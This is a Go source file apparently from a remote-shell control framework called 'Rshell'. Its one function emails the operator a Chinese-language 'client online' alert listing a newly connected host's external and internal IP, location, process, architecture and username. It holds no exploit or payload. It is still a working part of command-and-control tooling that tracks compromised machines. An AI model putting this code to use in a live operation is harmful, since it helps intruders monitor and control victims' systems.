package webhooks

import (
	"Rshell/pkg/database"
	"Rshell/pkg/logger"
	"fmt"
	"net/smtp"
)

func SendEmail(Client database.Clients, config EmailConfig) error {
	content := fmt.Sprintf("Rshell 客户端上线通知\n\nExternal_IP: %s\nLocation: %s\nProcess: %s\nArch: %s\nInternal_IP: %s\nUser: %s",
		Client.ExternalIP, Client.Address, Client.Process, Client.Arch, Client.InternalIP, Client.Username)

	auth := smtp.PlainAuth("", config.Username, config.Password, config.Host)

	msg := []byte("From: " + config.Username + "\r\n" +
		"To: " + config.To + "\r\n" +
		"Subject: Rshell 客户端上线\r\n" +
		"Content-Type: text/plain; charset=UTF-8\r\n" +
		"\r\n" +
		content + "\r\n")

	err := smtp.SendMail(fmt.Sprintf("%s:%d", config.Host, config.Port), auth, config.Username, []string{config.To}, msg)
	if err != nil {
		logger.Error("SendEmail: " + err.Error())
		return err
	}
	return nil
}
